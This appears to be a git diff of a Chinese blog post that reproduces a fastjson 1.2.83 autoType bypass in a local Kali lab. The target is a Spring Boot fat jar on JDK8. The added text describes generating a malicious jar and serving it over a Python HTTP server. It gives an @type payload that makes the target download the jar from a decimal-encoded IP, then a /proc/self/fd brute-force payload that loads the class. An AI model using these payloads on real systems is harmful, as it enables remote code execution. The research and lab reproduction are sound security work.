@@ -39,7 +39,7 @@ draft: false
 
 `autoTypeSupport`的值在fastjson1.2.83版本中默认是false，`expectClassFlag`的值在sink点为`JSON.parseObject(str)` 的场景下也默认为false（具体看传给checkAutoType的expectClass参数的值是什么，这里不详细展开讲，具体可看1342行附近的内容）,这里的重点在于jsonType的值，如何才能为true进入该if分支。
 
-jsonType的值初始是false。关键在"资源探测"这一步：将typeName里的 . 替换成 / 并且在末尾拼接上 .class 后将结果赋给resource，然后调用`getResourceAsStream(resource)`去取这个资源，若类的字节里带着 `@JSONType` 注解，`jsonType` 就改为 `true`。
+jsonType的值初始是false。关键在"资源探测"这一步：将**typeName里的 . 替换成 /** 并且在末尾拼接上 .class 后将结果赋给resource，然后调用`getResourceAsStream(resource)`去取这个资源，若类的字节里带着 `@JSONType` 注解，`jsonType` 就改为 `true`。由于.会被替换成/，所以我们ip使用了十进制形式。
 
 defaultClassLoader是ParserConfig单例的一个属性，如果没有人为去修改默认为null，因此会走到else分支，使用的类加载器为ParserConfig.class.getClassLoader()的值，即加载了fastjson组件的类加载器。若是springboot fatjar启动，则该类加载器为`LaunchedURLClassLoader`，它继承自 `URLClassLoader`，在 **JDK8** 下，其底层 `URLClassPath` 会把形如 `jar:http://...` 的资源名当作 **jar: URL** 解析（`JarURLConnection`），从而真的发起 HTTP 下载——这正是探测阶段能"远程拉 jar"、也是该利用必须springboot FatJar + JDK8 的根本原因。
 
@@ -161,7 +161,7 @@ import java.util.zip.ZipOutputStream;
  * 两段式全家桶 jar 生成器：
  *   - 条目 POC.class         内部名 jar:http://<decIP>:<port>/probe!/POC          （STAGE-1 下载用）
  *   - 条目 POC<N>.class      内部名 jar:file:/proc/self/fd/N!/POC<N>  (N=low..high)（STAGE-2 盲打用）
- * 用法: java TwoStageJarBuilder <输入.class> <decIP> <port> <输出.jar> <fdLow> <fdHigh>
+ * 用法: java TwoStageJarBuilder [源码.class] [十进制IP] [端口] [输出.jar] [fd下界] [fd上界] [入口名]
  */
 public class TwoStageJarBuilder {
 
@@ -267,5 +267,30 @@ public class TwoStageJarBuilder {
 }
 ```
 
-一切准备就绪，这边在vmware的kali里启动靶场，因为该漏洞刚需linux环境。
+一切准备就绪，这边在vmware的kali里启动靶场，因为该漏洞刚需linux环境。 在这里vmware kali的IP是192.168.100.178，宿主机windows的ip是192.168.100.171。
 
+![](3.png)
+
+使用刚才的脚本生成恶意类，如图所示。
+
+![](5.png)
+
+随后需要在Windows启动一个本地服务器，当有人访问/probe的时候，则返回这个x.jar，或者直接把x.jar改名为更名为probe也可以，直接以静态资源返回。根据自身情况而定，这里选择后者。
+
+```cmd
+python -m http.server 18080
+```
+
+![](6.png)
+
+第一步，发{**"@type"**:**"jar:http:..3232261291:18080.probe!.POC"**,**"x"**:**1**}，迫使服务器下载jar包。
+
+![](D:\Blogs\hanekoto_blog\src\content\posts\fastjson-1\8.png)
+
+第二步，构造字典进行爆破。{"@type":"jar:file:.proc.self.fd.N!.POCN","x":1}
+
+![](7.png)
+
+kali内部弹xeyes窗口，复现成功。
+
+![](9.png)
